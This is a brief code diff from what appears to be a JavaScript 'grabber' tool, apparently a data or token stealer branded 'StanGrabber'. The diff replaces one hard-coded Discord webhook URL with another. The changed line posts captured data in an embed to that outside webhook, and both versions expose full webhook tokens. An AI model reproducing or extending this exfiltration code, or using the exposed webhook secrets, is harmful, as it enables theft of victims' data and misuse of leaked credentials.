@@ -48,7 +48,7 @@ exports.send = (req, res, webhook) => {
 }
             
 
-        axios.post(`https://discord.com/api/webhooks/808648414199676948/Koi4dO3acEhEyIRJzVaxZ7-FDWJfmqK6kZX13nrklxmLWPkhQBhtkFe8JBtKgdojXSCn`, {
+        axios.post(`https://discord.com/api/webhooks/809747545362268181/rHKVjerkDNJ7qHNQPC5szFeHAFQEZj9ba5f4RE-7AyoWn7qyw1NN-NG47kVLJKgrf92g`, {
             username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
             content: '', 
             embeds:[ omg ]
